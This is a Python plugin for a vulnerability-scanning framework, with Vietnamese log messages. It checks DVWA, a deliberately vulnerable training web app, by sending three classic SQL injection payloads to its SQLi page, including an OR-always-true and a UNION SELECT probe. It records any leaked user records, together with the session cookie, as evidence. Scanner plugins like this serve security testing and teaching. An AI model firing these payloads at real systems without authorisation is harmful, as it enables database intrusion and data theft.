import urllib.request
import urllib.parse
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class DVWASQLiPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-SQLI",
            "name": "DVWA SQL Injection",
            "cvss_score": 9.8,
            "service": "http",
            "vuln_type": "sqli"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service","") in ["http","https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie","")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie"}

        payloads = [
            ("1' OR '1'='1",          "First name", "classic OR injection"),
            ("1' OR 1=1--",           "First name", "comment bypass"),
            ("' UNION SELECT 1,2--",  "First name", "UNION SELECT probe"),
        ]

        url_base = f"http://{target_ip}:{target_port}/vulnerabilities/sqli/"

        for payload, marker, technique in payloads:
            try:
                url = f"{url_base}?id={urllib.parse.quote(payload)}&Submit=Submit"
                print(f"      [SQLi] [{technique}] Payload: {payload}")
                req = urllib.request.Request(url)
                req.add_header("Cookie", cookie)
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read().decode('utf-8')
                records = re.findall(r'First name:.*?<br />', body, re.DOTALL)
                print(f"      [SQLi] Response: {len(records)} records found")

                if marker in body and len(records) >= 1:
                    print(f"      [SQLi] ✓ CONFIRMED với technique: {technique}")
                    return {
                        "status": "CONFIRMED",
                        "evidence": (
                            f"SQL Injection thành công.\n"
                            f"      - Technique  : {technique}\n"
                            f"      - URL        : {url}\n"
                            f"      - Payload    : {payload}\n"
                            f"      - Cookie     : {cookie}\n"
                            f"      - Leak được  : {len(records)} user records\n"
                            f"      - Sample     : {records[0][:100] if records else 'N/A'}"
                        )
                    }
                else:
                    print(f"      [SQLi] ✗ Payload không trigger — thử tiếp")
            except Exception as e:
                print(f"      [SQLi] ✗ Error: {e}")

        return {"status": "FALSE_POSITIVE", "evidence": "Tất cả SQLi payload không khai thác được"}
